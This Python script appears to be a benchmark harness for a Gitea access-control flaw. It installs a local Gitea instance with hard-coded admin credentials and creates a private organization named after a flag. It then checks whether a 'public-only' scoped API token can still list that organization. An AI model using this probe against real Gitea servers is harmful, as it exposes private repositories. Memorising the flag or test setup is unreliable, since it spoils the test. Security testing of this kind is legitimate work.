import json, re, time, urllib.request, urllib.error, base64

BASE = "http://127.0.0.1:56841"
FLAG = "PCBFLAG_cefa5ac0fbdc"
ADMIN = "pcbadmin"
PASS = "Admin12345!"
AUTH = "Basic " + base64.b64encode(f"{ADMIN}:{PASS}".encode()).decode()

def req(method, path, data=None, headers=None, timeout=30):
    url = BASE + path
    hdr = {"Accept": "application/json"}
    if headers: hdr.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        hdr["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=hdr, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)

def wait_ready(timeout=240):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s, b = req("GET", "/", timeout=5)
            if s < 500: return True
        except Exception:
            pass
        time.sleep(4)
    return False

def install():
    s, html = req("GET", "/", timeout=10)
    if "admin_name" not in html:
        return True
    m = re.search(r'name="_csrf" content="([^"]+)"', html)
    csrf = m.group(1) if m else ""
    form = {
        "_csrf": csrf, "db_type": "sqlite3", "db_path": "/data/gitea/gitea.db",
        "app_name": "Gitea", "repo_root_path": "/data/git/repositories", "run_user": "git",
        "domain": "localhost", "ssh_port": "22", "http_port": "3000",
        "app_url": f"http://localhost:56841/", "log_root_path": "/data/gitea/log",
        "admin_name": ADMIN, "admin_passwd": PASS, "admin_confirm_passwd": PASS,
        "admin_email": "admin@pcb.local",
    }
    s, b = req("POST", "/", data=form, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return wait_ready(timeout=120)

def setup(flag):
    install()
    org = "pcb_" + flag.lower()
    s, b = req("POST", "/api/v1/orgs", data={"username": org, "visibility": "private"}, headers={"Authorization": AUTH})
    print("create org status:", s)
    s, b = req("POST", f"/api/v1/orgs/{org}/repos", data={"name": "secret_"+flag.lower(), "private": True, "auto_init": True, "default_branch": "main"}, headers={"Authorization": AUTH})
    print("create repo status:", s)
    tok = None
    for i in range(6):
        s, b = req("POST", f"/api/v1/users/{ADMIN}/tokens", data={"name": f"pubtok{int(time.time())}{i}", "scopes": ["read:user","read:organization","read:repository","public-only"]}, headers={"Authorization": AUTH})
        if s in (201,200) and '"sha1"' in b:
            tok = json.loads(b)["sha1"]
            break
    print("token created:", bool(tok))
    return org, tok

print("wait_ready:", wait_ready())
org, tok = setup(FLAG)
if tok:
    s, b = req("GET", "/api/v1/user/orgs", headers={"Authorization": f"token {tok}"})
    print("RESIDUAL status:", s)
    print("RESIDUAL body:", b)
    print("RESIDUAL ok:", FLAG.lower() in b)
